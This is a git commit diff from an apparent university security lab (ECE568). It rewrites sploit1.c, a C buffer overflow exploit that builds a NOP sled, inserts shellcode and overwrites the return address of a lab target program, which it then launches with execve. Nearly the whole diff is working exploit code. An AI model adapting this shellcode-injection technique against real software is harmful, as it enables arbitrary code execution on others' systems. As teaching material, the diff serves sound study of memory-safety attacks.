d6c2e225dad71532f64be0246b48f44af55fe286
Mahsa Naserifar <mahsa@render.com>
2020-01-30 00:41:55 -0500

    Removing shell null term

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -5,41 +5,54 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-
-#define SHELL_SIZE 45
-#define BUF_TO_RET 120
-#define BUF_SIZE 129
-#define BUF_ADDR 0x2021fe10
+#define STACK_ADDR 0x202dfe80
+#define LOCAL_SIZE 112
+#define EBP_SIZE 8
+#define RET_SIZE 8
+#define BUFF_SIZE (LOCAL_SIZE + EBP_SIZE + RET_SIZE)
 
 int
 main ( int argc, char * argv[] )
 {
-	char *	args[3];
-	char *	env[1];
-	unsigned char attack_buffer[BUF_SIZE];
+
+	char buff[BUFF_SIZE + 1];
+	int i;
+	int shell_size = sizeof(shellcode) - 1;
+
+	// fill first half with NOP
+	for (i = 0; i < BUFF_SIZE - shell_size; i++){
+		buff[i] = 0x90; // NOP
+	}
+
+	// copy shell code
+	for (i = 0; i < shell_size; i++){
+		buff[BUFF_SIZE - RET_SIZE - shell_size + i] = shellcode[i];
+	}
+
+	// calcualte stack target address
+	int target = STACK_ADDR - LOCAL_SIZE;
+	buff[BUFF_SIZE - RET_SIZE] = (char) (target & 0xff);
+	buff[BUFF_SIZE - RET_SIZE + 1] = (char) ((target >> 8) & 0xff);
+	buff[BUFF_SIZE - RET_SIZE + 2] = (char) ((target >> 16) & 0xff);
+	buff[BUFF_SIZE - RET_SIZE + 3] = (char) ((target >> 24) & 0xff);
+
+	// terminate buff with NULL
+	buff[BUFF_SIZE - RET_SIZE + 4] = '\0';
 
 	
-	for (int i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
-		attack_buffer[i] = 0x90;
-	for (int i = 0; i < SHELL_SIZE; i++)
-		attack_buffer[BUF_TO_RET - SHELL_SIZE + i] = shellcode[i];
-
-	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xFF);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR & 0x0000FF00) >> 8);
-	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR & 0x00FF0000) >> 16);
-	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xFF000000) >> 24);
-	attack_buffer[BUF_TO_RET + 4] = '\0';
-
-	printf("attack_buffer %s\n",attack_buffer);
+	char *	args[3];
+	char *	env[1];
 
 	args[0] = TARGET;
-	args[1] = attack_buffer;
+	args[1] = buff;
 	args[2] = NULL;
 
 	env[0] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
+
+	
 
 	return (0);
 }
